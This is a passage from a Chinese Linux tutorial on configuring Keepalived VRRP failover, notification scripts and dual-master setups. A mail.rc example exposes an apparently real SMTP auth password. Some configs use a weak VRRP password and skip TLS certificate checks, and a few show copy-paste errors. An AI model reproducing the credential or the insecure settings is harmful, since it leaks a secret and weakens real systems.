[root@centos7 ~]# systemctl daemon-reload
[root@centos7 ~]# systemctl restart nginx
```

## 42.高可用集群KeepAlived

### 42.1 Keepalived架构

```
#1.官方文档：
https://keepalived.org/doc/
http://keepalived.org/documentation.html




#2.用户空间核心组件：
vrrp stack：VIP消息通告
checkers：监测real server
system call：实现 vrrp 协议状态转换时调用脚本的功能
SMTP：邮件组件
IPVS wrapper：生成IPVS规则
Netlink Reflector：网络接口
WatchDog：监控进程
控制组件：提供keepalived.conf 的解析器，完成Keepalived配置
IO复用器：针对网络目的而优化的自己的线程抽象
内存管理组件：为某些通用的内存管理功能（例如分配，重新分配，发布等）提供访问权限



#3.功能：
基于vrrp协议完成地址流动
为vip地址所在的节点生成ipvs规则(在配置文件中预先定义) 为ipvs集群的各RS做健康状态检测
基于脚本调用接口完成脚本中定义的功能，进而影响集群事务，以此支持nginx、haproxy等服务
```

![1656673712631](linux体系.assets/1656673712631.png)

### 42.2 Keepalived安装

![1656674439128](linux体系.assets/1656674439128.png)

#### 42.2.1 环境部署

**10.0.0.8**

```
#1.安装包
[root@ka1 ~]# yum -y install keepalived



#2.修改配置文件
[root@ka1 ~]# mkdir /etc/keepalived/conf.d/

#2.1修改主配置文件
[root@ka1 ~]# vim /etc/keepalived/keepalived.conf
! Configuration File for keepalived
  
global_defs {
   notification_email {
     1805336068@qq.com
   }
   notification_email_from 1805336068@qq.com
   smtp_server 127.0.0.1
   smtp_connect_timeout 30
   router_id ka1
   vrrp_skip_check_adv_addr
   vrrp_garp_interval 0
   vrrp_gna_interval 0
}

include /etc/keepalived/conf.d/*.conf


#2.2修改子配置文件
[root@ka1 ~]# vim /etc/keepalived/conf.d/liu1.conf
vrrp_instance liu1 {
    state MASTER   #主服务器
    interface eth0
    virtual_router_id 66
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
}





#3.查看VIP 10.0.0.10有没有飘到机器上
[root@ka1 ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:5e:6b:05 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.8/24 brd 10.0.0.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet 10.0.0.10/24 scope global secondary eht0:1   #成功！！
       valid_lft forever preferred_lft forever
       
       
       
       


#4.关闭服务或者断电模拟故障
#查看VIP会不会飘到10.0.0.18的机器上或者客户端时否依旧能ping的通10.0.0.10
[root@ka1 ~]# systemctl stop keepalived.service 
```

**10.0.0.18**

```
#1.安装包
root@ka2:~# yum -y install keepalived


#2.修改配置文件
root@ka2:~# mkdir /etc/keepalived/conf.d/

#2.1修改主配置文件
root@ka2:~# vim /etc/keepalived/keepalived.conf
! Configuration File for keepalived
  
global_defs {
   notification_email {
     1805336068@qq.com
   }
   notification_email_from 1805336068@qq.com
   smtp_server 127.0.0.1
   smtp_connect_timeout 30
   router_id ka2
   vrrp_skip_check_adv_addr
   vrrp_garp_interval 0
   vrrp_gna_interval 0
}

include /etc/keepalived/conf.d/*.conf

#2.2修改子配置文件
root@ka2:~# vim /etc/keepalived/conf.d/liu1.conf
vrrp_instance liu1 {
    state BACKUP    #备用服务器
    interface eth0
    virtual_router_id 66
    priority 80
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
}
root@ka2:~# systemctl restart keepalived.service




#3.10.0.0.8故障后VIP顺利飘到10.0.0.18机器上
root@ka2:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:0a:a1:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.18/24 brd 10.0.0.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet 10.0.0.10/24 scope global secondary eht0:1
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe0a:a1c9/64 scope link 
       valid_lft forever preferred_lft forever
```

**10.0.0.7**

```
#客户端
#1.ping 虚拟IP 10.0.0.10
[23:45:39 root@centos7 ~]#ping 10.0.0.10
PING 10.0.0.10 (10.0.0.10) 56(84) bytes of data.
64 bytes from 10.0.0.10: icmp_seq=1 ttl=64 time=0.290 ms
64 bytes from 10.0.0.10: icmp_seq=2 ttl=64 time=0.504 ms
#故障后客户端依旧没有任何影响，依然可以ping的通




#2.抓包
[root@centos7 ~]# tcpdump -i eth0 -nn host 224.0.0.18
#故障后的情况
23:52:55.129383 IP 10.0.0.18 > 224.0.0.18: VRRPv2, Advertisement, vrid 66, prio 80, authtype simple, intvl 1s, length 20
23:52:56.130524 IP 10.0.0.18 > 224.0.0.18: VRRPv2, Advertisement, vrid 66, prio 80, authtype simple, intvl 1s, length 20
23:52:57.131048 IP 10.0.0.18 > 224.0.0.18: VRRPv2, Advertisement, vrid 66, prio 80, authtype simple, intvl 1s, length 20
23:52:58.131916 IP 10.0.0.18 > 224.0.0.18: VRRPv2, Advertisement, vrid 66, prio 80, authtype simple, intvl 1s, length 20
```

#### 42.2.2 yum安装

```
#CentOS
[root@centos ~]# yum -y install keepalived

#ubuntu
[root@ubuntu1804 ~]#apt -y install keepalived
```

#### 42.2.3 编译安装

```
#2.编译安装
#2.1安装依赖包
[root@centos7 ~]# yum -y install gcc curl openssl-devel libnl3-devel net-snmp-devel


#2.2下载源码包
[root@centos7 ~]# yum -y install wget;wget https://keepalived.org/software/keepalived-2.2.2.tar.gz --no-check-certificate
[root@centos7 ~]# tar xvf keepalived-2.2.2.tar.gz -C /usr/local/src/


#2.3编译安装
[root@centos7 ~]# cd /usr/local/src/
[root@centos7 keepalived-2.2.2]# ./configure --prefix=/usr/apps/keepalived 
[root@centos7 keepalived-2.2.2]# make && make install


#2.4创建软连接
[root@centos7 keepalived-2.2.2]# ln -s /apps/keepalived/sbin/keepalived /usr/sbin/


#2.5查看版本号
[root@centos7 keepalived-2.2.2]# keepalived -v
Keepalived v2.2.2 (03/05,2021)


#2.6创建配置文件
[root@centos7 keepalived-2.2.2]# mkdir /etc/keepalived
[root@centos7 keepalived-2.2.2]# cp /apps/keepalived/etc/keepalived/keepalived.conf /etc/keepalived
[root@centos7 keepalived-2.2.2]# systemctl start keepalived.service
```

### 42.3 KeepAlived配置说明

#### 42.3.1 配置文件组成部分

```
/etc/keepalived/keepalived.conf 配置组成

GLOBAL CONFIGURATION
Global definitions：定义邮件配置，route_id，vrrp配置，多播地址等

VRRP CONFIGURATION
VRRP instance(s)：定义每个vrrp虚拟路由器

LVS CONFIGURATION
Virtual server group(s)
Virtual server(s)：LVS集群的VS和RS
```

#### 42.3.2 全局配置

```
#1.概述
#/etc/keepalived/keepalived.conf 
global_defs {
 notification_email {
 root@localhost #keepalived 发生故障切换时邮件发送的目标邮箱，可以按行区分写多个
 root@liusenbiao.com 
  1805336068@qq.com 
 }
 notification_email_from keepalived@localhost  #发邮件的地址
 smtp_server 127.0.0.1     #邮件服务器地址
 smtp_connect_timeout 30   #邮件服务器连接timeout
 router_id ka1.example.com #每个keepalived主机唯一标识，建议使用当前主机名，但多节点重名不影响
 vrrp_skip_check_adv_addr  #对所有通告报文都检查，会比较消耗性能，启用此配置后，如果收到的通告报文和上一个报文是同一个路由器，则跳过检查，默认值为全检查
 vrrp_strict #严格遵守VRRP协议,启用此项后以下状况将无法启动服务:1.无VIP地址 2.配置了单播邻居 3.在VRRP版本2中有IPv6地址，开启动此项并且没有配置vrrp_iptables时会自动开启iptables防火墙规则，默认导致VIP无法访问,建议不加此项配置
 vrrp_garp_interval 0 #gratuitous ARP messages 报文发送延迟，0表示不延迟
 vrrp_gna_interval 0  #unsolicited NA messages （不请自来）消息发送延迟
 vrrp_mcast_group4 224.0.0.18 #指定组播IP地址范围：224.0.0.0到239.255.255.255,默认值：224.0.0.18 
 vrrp_iptables        #此项和vrrp_strict同时开启时，则不会添加防火墙规则,如果无配置vrr
 
 
 


#2.案例
[root@ka1 ~]# vim /etc/keepalived/keepalived.conf
global_defs {
   notification_email {
     1805336068@qq.com
   }
   notification_email_from 1805336068@qq.com
   smtp_server 127.0.0.1
   smtp_connect_timeout 30
   router_id ka1
   vrrp_skip_check_adv_addr
   vrrp_garp_interval 0
   vrrp_gna_interval 0
}
include /etc/keepalived/conf.d/*.conf
```

#### 42.3.3 配置虚拟路由器

```
#1.概述
#/etc/keepalived/keepalived.conf 
vrrp_instance <STRING> { #<String>为vrrp的实例名,一般为业务名称
 配置参数
 ......
 }
 
#配置参数：
state MASTER|BACKUP  #当前节点在此虚拟路由器上的初始状态，状态为MASTER或者BACKUP
interface IFACE_NAME #绑定为当前虚拟路由器使用的物理接口，如：eth0,bond0,br0,可以和VIP不在一个网卡
virtual_router_id VRID #每个虚拟路由器惟一标识，范围：0-255，每个虚拟路由器此值必须唯一，否则服务无法启动，同属一个虚拟路由器的多个keepalived节点必须相同,务必要确认在同一网络中此值必须唯一
priority 100 #当前物理节点在此虚拟路由器的优先级，范围：1-254，每个keepalived主机节点此值不同
advert_int 1 #vrrp通告的时间间隔，默认1s
authentication { #认证机制
 auth_type AH|PASS   #AH为IPSEC认证(不推荐),PASS为简单密码(建议使用)
 auth_pass <PASSWORD> #预共享密钥，仅前8位有效，同一个虚拟路由器的多个keepalived节点必须一样
}
virtual_ipaddress {  #虚拟IP,生产环境可能指定上百个IP地址
 <IPADDR>/<MASK> brd <IPADDR> dev <STRING> scope <SCOPE> label <LABEL>
 192.168.200.100  #指定VIP，不指定网卡，默认为eth0,注意：不指定/prefix,默认
为/32
 192.168.200.101/24 dev eth1   #指定VIP的网卡，建议和interface指令指定的岗卡不在一个
网卡
 192.168.200.102/24 dev eth2 label eth2:1 #指定VIP的网卡label 
}
track_interface { #配置监控网络接口，一旦出现故障，则转为FAULT状态实现地址转移
 eth0
 eth1
 …
}




#2.案例
[root@ka1 ~]# mkdir /etc/keepalived/conf.d/
[root@ka1 ~]# cd /etc/keepalived/conf.d/
[root@ka1 conf.d]# vim liu1.conf
vrrp_instance liu1 {
    state MASTER
    interface eth0
    virtual_router_id 66
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
}
```

#### 42.3.4 实现独立子配置文件

```
#1.概述
当生产环境复杂时， /etc/keepalived/keepalived.conf 文件中内容过多，不易管理，可以将不同集群的配置，比如：不同集群的VIP配置放在独立的子配置文件中
利用include 指令可以实现包含子配置文件




#2.案例：
[root@ka1-centos8 ~]# mkdir /etc/keepalived/conf.d/
[root@ka1-centos8 ~]# vim /etc/keepalived/keepalived.conf
global_defs {
   notification_email {
        29308620@qq.com
   }
   notification_email_from 29308620@qq.com 
   smtp_server 127.0.0.1
   smtp_connect_timeout 30
   router_id ka1.magedu.org 
   vrrp_skip_check_adv_addr
   vrrp_garp_interval 0
   vrrp_gna_interval 0 }
include /etc/keepalived/conf.d/*.conf   #将VRRP相关配置放在子配置文件中
[root@ka1-centos8 ~]#vim /etc/keepalived/conf.d/cluster1.conf
```

#### 42.3.5 非抢占模式nopreempt

```
#1.概述
默认为抢占模式preempt，即当高优先级的主机恢复在线后，会抢占低先级的主机的master角色，造成网络抖动，建议设置为非抢占模式 nopreempt ，即高优级主机恢复后，并不会抢占低优先级主机的master角色

此外原主机down机迁移至新主机后续也发生down时,会将VIP迁移回原主机
注意：要关闭VIP抢占，必须将各keepalived服务器state配置BACKUP






#2.案例

#2.1 10.0.0.8机器上
[root@ka1 ~]# vim /etc/keepalived/conf.d/liu1.conf
vrrp_instance liu1 {
    state BACKUP    #将MASTER改为BACKUP
    interface eth0
    virtual_router_id 66
    priority 100
    nopreempt    #非抢占
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
}
[root@ka1 ~]# systemctl restart keepalived.service

#2.2 10.0.0.18机器上
root@ka2:~# vim /etc/keepalived/conf.d/liu1.conf
vrrp_instance liu1 {
    state BACKUP
    interface eth0
    virtual_router_id 66
    priority 80
    nopreempt   #非抢占
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
}
root@ka2:~#  systemctl restart keepalived.service
```

#### 42.3.6 抢占延迟模式preempt_delay

```
#1.概述
抢占延迟模式，即优先级高的主机恢复后，不会立即抢回VIP，而是延迟一段时间（默认300s）再抢回VIP

注意：需要各keepalived服务器state为BACKUP,并且不要启vrrp_strict





#2.案例
#2.1 10.0.0.8机器上
[root@ka1 ~]# vim /etc/keepalived/conf.d/liu1.conf
vrrp_instance liu1 {
    state BACKUP    #将MASTER改为BACKUP
    interface eth0
    virtual_router_id 66
    priority 100
    preempt_delay 30  #延迟30s
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
}
[root@ka1 ~]# systemctl restart keepalived.service

#2.2 10.0.0.18机器上
root@ka2:~# vim /etc/keepalived/conf.d/liu1.conf
vrrp_instance liu1 {
    state BACKUP
    interface eth0
    virtual_router_id 66
    priority 80
    preempt_delay 30  #延迟30s
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
}
root@ka2:~#  systemctl restart keepalived.service
```

#### 42.3.7自定义多播地址

```
#1.10.0.0.8机器上
[root@ka1 ~]# vim /etc/keepalived/keepalived.conf
! Configuration File for keepalived
  
global_defs {
   notification_email {
     1805336068@qq.com
   }
   notification_email_from 1805336068@qq.com
   smtp_server 127.0.0.1
   smtp_connect_timeout 30
   router_id ka1
   vrrp_skip_check_adv_addr
   vrrp_garp_interval 0
   vrrp_gna_interval 0
   vrrp_mcast_group4 234.6.6.6   #注意多播地址一定是D类地址
}

include /etc/keepalived/conf.d/*.conf
[root@ka1 ~]# systemctl restart keepalived.service



#2.10.0.0.18机器上
root@ka2:~# vim /etc/keepalived/keepalived.conf
! Configuration File for keepalived
  
global_defs {
   notification_email {
     1805336068@qq.com
   }
   notification_email_from 1805336068@qq.com
   smtp_server 127.0.0.1
   smtp_connect_timeout 30
   router_id ka2
   vrrp_skip_check_adv_addr
   vrrp_garp_interval 0
   vrrp_gna_interval 0
   vrrp_mcast_group4 234.6.6.6    #注意多播地址一定是D类地址
}

include /etc/keepalived/conf.d/*.conf
root@ka2:~# systemctl restart keepalived.service



#3.抓包查看是否生效
[root@centos7 ~]# tcpdump -i eth0 -nn host 234.6.6.6
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
09:34:50.610965 IP 10.0.0.8 > 234.6.6.6: VRRPv2, Advertisement, vrid 66, prio 100, authtype simple, intvl 1s, length 20
09:34:51.611927 IP 10.0.0.8 > 234.6.6.6: VRRPv2, Advertisement, vrid 66, prio 100, authtype simple, intvl 1s, length 20
09:34:52.612558 IP 10.0.0.8 > 234.6.6.6: VRRPv2, Advertisement, vrid 66, prio 100, authtype simple, intvl 1s, length 20
```

#### 42.3.8VIP单播配置

```
#1.概述
默认keepalived主机之间利用多播相互通告消息，会造成网络拥塞，可以替换成单播，减少网络流量
注意：启用 vrrp_strict 时，不能启用单播



#2.案例：

#2.1 10.0.0.8机器上
[root@ka1 ~]# vim /etc/keepalived/conf.d/liu1.conf
vrrp_instance liu1 {
    state BACKUP
    interface eth0
    virtual_router_id 66
    priority 100
    preempt_delay 30
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
     unicast_src_ip 10.0.0.8
     unicast_peer{
     10.0.0.18
   }
}
[root@ka1 ~]# systemctl restart keepalived.service


#2.2 10.0.0.18机器上
vrrp_instance liu1 {
    state BACKUP
    interface eth0
    virtual_router_id 66
    priority 80
    preempt_delay 30
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
    unicast_src_ip 10.0.0.18
    unicast_peer{
    10.0.0.8
   }
}
root@ka2:~# systemctl restart keepalived.service






#3.抓包查看单播
[root@centos7 ~]# tcpdump -i eth0 -nn src host 10.0.0.8 and dst host 10.0.0.18
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
10:18:30.705864 IP 10.0.0.8 > 10.0.0.18: VRRPv2, Advertisement, vrid 66, prio 100, authtype simple, intvl 1s, length 20
10:18:30.747857 ARP, Request who-has 10.0.0.18 tell 10.0.0.8, length 46
10:18:31.706107 IP 10.0.0.8 > 10.0.0.18: VRRPv2, Advertisement, vrid 66, prio 100, authtype simple, intvl 1s, length 20
10:18:32.707077 IP 10.0.0.8 > 10.0.0.18: VRRPv2, Advertisement, vrid 66, prio 100, authtype simple, intvl 1s, length 20
10:18:33.707163 IP 10.0.0.8 > 10.0.0.18: VRRPv2, Advertisement, vrid 66, prio 100, authtype simple, intvl 1s, length 20
```

### 42.4 Keepalived企业应用

#### 42.4.1Keepalived 通知脚本配置

##### 42.4.1.1 通知脚本类型

```
#1.脚本类型
当前节点成为主节点时触发的脚本
notify_master <STRING>|<QUOTED-STRING>

当前节点转为备节点时触发的脚本
notify_backup <STRING>|<QUOTED-STRING>

当前节点转为“失败”状态时触发的脚本
notify_fault <STRING>|<QUOTED-STRING>

通用格式的通知触发机制，一个脚本可完成以上三种状态的转换时的通知
notify <STRING>|<QUOTED-STRING>

当停止VRRP时触发的脚本
notify_stop <STRING>|<QUOTED-STRING>





#2.脚本的调用方法
在vrrp_instance VI_1语句块的末尾加下面行
notify_master "/etc/keepalived/notify.sh master"
notify_backup "/etc/keepalived/notify.sh backup"
notify_fault "/etc/keepalived/notify.sh fault"
```

##### 42.4.1.2 创建通知脚本

**10.0.0.8**

```
#1.在10.0.0.8上

1.1 创建通知脚本
[root@ka1 ~]# vim /etc/keepalived/notify.sh
#!/bin/bash
# 
#********************************************************************
#Author:        liusenbiao
#Date:          2022-06-30
#FileName：      notify.sh
#Description：   邮件通知脚本 
#********************************************************************
contact='1805336068@qq.com'

notify() {
    mailsubject="$(hostname) to be $1, vip floating"
    mailbody="$(date +'%F %T'): vrrp transition, $(hostname) changed to be $1"
    echo "$mailbody" | mail -s "$mailsubject" $contact
}

case $1 in
master)
   notify master
   ;;
backup)
   notify backup
   ;;
fault)
   notify fault
   ;;
*)
   echo "Usage: $(basename $0) {master|backup|fault}"
   exit 1
   ;;
   esac
[root@ka1 ~]# chmod +x /etc/keepalived/notify.sh   
   
   
#1.2邮件配置
[root@ka1 ~]# vim /etc/mail.rc
#在最后一行加上
set from=1805336068@qq.com
set smtp=smtp.qq.com
set smtp-auth-user=1805336068@qq.com
set smtp-auth-password=mkmzfnyrjkojbgfg



#1.3在vrrp_instance VI_1语句块的末尾加下面行
[root@ka1 ~]# vim /etc/keepalived/conf.d/liu1.conf
vrrp_instance liu1 {
    state BACKUP
    interface eth0
    virtual_router_id 66
    priority 100
    preempt_delay 30
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
     unicast_src_ip 10.0.0.8
     unicast_peer{
     10.0.0.18
   }
     notify_master "/etc/keepalived/notify.sh master"  #添加这三行
     notify_backup "/etc/keepalived/notify.sh backup"  #添加这三行
     notify_fault "/etc/keepalived/notify.sh fault"    #添加这三行
}
[root@ka1 ~]# systemctl restart keepalived.service
```

**10.0.0.18**

```
#1.在10.0.0.8上

1.1 创建通知脚本
[root@ka2 ~]# vim /etc/keepalived/notify.sh
#!/bin/bash
# 
#********************************************************************
#Author:        liusenbiao
#Date:          2022-06-30
#FileName：      notify.sh
#Description：   邮件通知脚本 
#********************************************************************
contact='1805336068@qq.com'

notify() {
    mailsubject="$(hostname) to be $1, vip floating"
    mailbody="$(date +'%F %T'): vrrp transition, $(hostname) changed to be $1"
    echo "$mailbody" | mail -s "$mailsubject" $contact
}

case $1 in
master)
   notify master
   ;;
backup)
   notify backup
   ;;
fault)
   notify fault
   ;;
*)
   echo "Usage: $(basename $0) {master|backup|fault}"
   exit 1
   ;;
   esac
[root@ka2 ~]# chmod +x /etc/keepalived/notify.sh   
   
   
#1.2邮件配置
[root@ka2 ~]# vim /etc/mail.rc
#在最后一行加上
set from=1805336068@qq.com
set smtp=smtp.qq.com
set smtp-auth-user=1805336068@qq.com
set smtp-auth-password=mkmzfnyrjkojbgfg



#1.3在vrrp_instance VI_1语句块的末尾加下面行
[root@ka2 ~]# vim /etc/keepalived/conf.d/liu1.conf
vrrp_instance liu1 {
    state BACKUP
    interface eth0
    virtual_router_id 66
    priority 100
    preempt_delay 30
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
     unicast_src_ip 10.0.0.8
     unicast_peer{
     10.0.0.18
   }
     notify_master "/etc/keepalived/notify.sh master"  #添加这三行
     notify_backup "/etc/keepalived/notify.sh backup"  #添加这三行
     notify_fault "/etc/keepalived/notify.sh fault"    #添加这三行
}
[root@ka1 ~]# systemctl restart keepalived.service
```

![1656732151858](linux体系.assets/1656732151858.png)

#### 42.4.2 Keepalived双主架构

```
#1.概述
master/slave的单主架构，同一时间只有一个Keepalived对外提供服务，此主机繁忙，而另一台主机却很空闲，利用率低下，可以使用master/master的双主架构，解决此问题。

master/master 的双主架构：
即将两个或以上VIP分别运行在不同的keepalived服务器，以实现服务器并行提供web访问的目的，提高服务器资源利用率
```

**10.0.0.8**

```
#1.修改子配置文件
[root@ka1 ~]#  vim /etc/keepalived/conf.d/liu1.conf
vrrp_instance liu1 {
    state MASTER   #改成MASTER
    interface eth0
    virtual_router_id 66
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
     unicast_src_ip 10.0.0.8
     unicast_peer{
     10.0.0.18
   }
     notify_master "/etc/keepalived/notify.sh master"
     notify_backup "/etc/keepalived/notify.sh backup"
     notify_fault "/etc/keepalived/notify.sh fault"
}





#2.创建新项目
#新项目里10.0.0.8是备用服务器，10.0.0.18是主服务器
[root@ka1 ~]# cd /etc/keepalived/conf.d/
[root@ka1 conf.d]# cp liu1.conf liu2.conf
[root@ka1 conf.d]# vim liu2.conf
vrrp_instance liu2 {
    state BACKUP
    interface eth0
    virtual_router_id 88
    priority 80
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.20/24 dev eth0 label eht0:2
    }
     unicast_src_ip 10.0.0.8
     unicast_peer{
     10.0.0.18
   }
     notify_master "/etc/keepalived/notify.sh master"
     notify_backup "/etc/keepalived/notify.sh backup"
     notify_fault "/etc/keepalived/notify.sh fault"
}





#3.查看VIP
[root@ka1 conf.d]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:5e:6b:05 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.8/24 brd 10.0.0.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet 10.0.0.10/24 scope global secondary eht0:1
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe5e:6b05/64 scope link 
       valid_lft forever preferred_lft forever

```

**10.0.0.18**

```
#1.修改子配置文件
root@ka2:~# vim /etc/keepalived/conf.d/liu1.conf
vrrp_instance liu1 {
    state BACKUP
    interface eth0
    virtual_router_id 66
    priority 80
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
    unicast_src_ip 10.0.0.18
    unicast_peer{
    10.0.0.8
   }
     notify_master "/etc/keepalived/notify.sh master"
     notify_backup "/etc/keepalived/notify.sh backup"
     notify_fault "/etc/keepalived/notify.sh fault"
}




#2.创建新项目
#新项目里10.0.0.8是备用服务器，10.0.0.18是主服务器
[root@ka2 ~]# cd /etc/keepalived/conf.d/
[root@ka2 conf.d]# cp liu1.conf liu2.conf
[root@ka2 conf.d]# vim liu2.conf
vrrp_instance liu2 {
    state MASTER
    interface eth0 
    virtual_router_id 88
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.20/24 dev eth0 label eht0:2
    }
    unicast_src_ip 10.0.0.18
    unicast_peer{
    10.0.0.8
   }
     notify_master "/etc/keepalived/notify.sh master"
     notify_backup "/etc/keepalived/notify.sh backup"
     notify_fault "/etc/keepalived/notify.sh fault"
}
root@ka2:/etc/keepalived/conf.d# systemctl restart keepalived.service





#3.查看VIP
root@ka2:/etc/keepalived/conf.d# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:0a:a1:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.18/24 brd 10.0.0.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet 10.0.0.20/24 scope global secondary eht0:1
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe0a:a1c9/64 scope link 
       valid_lft forever preferred_lft forever
```

#### 42.4.3 Keepalived日志管理

```
[root@ka1 conf.d]# vim /etc/sysconfig/keepalived
KEEPALIVED_OPTIONS="-D -S 6"
[root@ka1 conf.d]# vim /etc/rsyslog.conf
66 local6.*                                                /var/log/keepalived.log
[root@ka1 conf.d]# systemctl restart rsyslog.service keepalived.service
[root@ka1 conf.d]# tail -f /var/log/keepalived.log #查看日志
Jul  2 16:56:49 ka1 Keepalived_vrrp[6200]: (liu2) Sending/queueing gratuitous ARPs on eth0 for 10.0.0.20
Jul  2 16:56:49 ka1 Keepalived_vrrp[6200]: Sending gratuitous ARP on eth0 for 10.0.0.20
Jul  2 16:56:49 ka1 Keepalived_vrrp[6200]: Sending gratuitous ARP on eth0 for 10.0.0.20
Jul  2 16:56:49 ka1 Keepalived_vrrp[6200]: Sending gratuitous ARP on eth0 for 10.0.0.20
Jul  2 16:56:49 ka1 Keepalived_vrrp[6200]: Sending gratuitous ARP on eth0 for 10.0.0.20
```

#### 42.4.4 Keepalived脑裂现象

```
1.什么是脑裂？
假设有两个服务器k1和k2,为了探测对方的状态中间拉了一条心跳线，其中两个服务器都有自己的业务网络，假使心跳线断了,但是他的业务网络还在，keepalived发现接受不到对方发来的报文会自动把对方的地址给抢过来，于是客户端访问的时候会出现两个机器上都会有拥有相同的MAC地址，客户端不知道去访问到底哪个机器，这就是脑裂现象。
我工作的时候就是同事配置了一条错误的防火墙规则导致一个机器收不到另一个机器发送过来的报文。





2.解决方案
早期是用fence解决脑裂现象，比较粗暴，现在依靠监控措施写监控脚本来解决，
```

### 42.5 IPVS的高可用性

![1656756192464](linux体系.assets/1656756192464.png)

#### 42.5.1虚拟服务器配置结构

```
 virtual_server IP port {
   ...
 real_server {
 ...
 }
 real_server {
 ...
 }
 …
}
```

#### 42.5.2 虚拟服务器的定义格式

```
virtual_server IP port     #定义虚拟主机IP地址及其端口
virtual_server fwmark int #ipvs的防火墙打标，实现基于防火墙的负载均衡集群
virtual_server group string #使用虚拟服务器组
```

#### 42.5.3 虚拟服务器组

```
将多个虚拟服务器定义成一个组，统一对外服务，如：http和https定义成一个虚拟服务器组

#参考文档：/usr/share/doc/keepalived/keepalived.conf.virtual_server_group
virtual_server_group <STRING> {
           # Virtual IP Address and Port
           <IPADDR> <PORT>
           <IPADDR> <PORT>
           ...
           # <IPADDR RANGE> has the form
           # XXX.YYY.ZZZ.WWW-VVV eg 192.168.200.1-10
           # range includes both .1 and .10 address
           <IPADDR RANGE> <PORT># VIP range VPORT
           <IPADDR RANGE> <PORT>
           ...
           # Firewall Mark (fwmark)
           fwmark <INTEGER>
           fwmark <INTEGER>
           ...
}
```

#### 42.5.4 虚拟服务器配置

```
virtual_server IP port {  #VIP和PORT
 delay_loop <INT>  #检查后端服务器的时间间隔
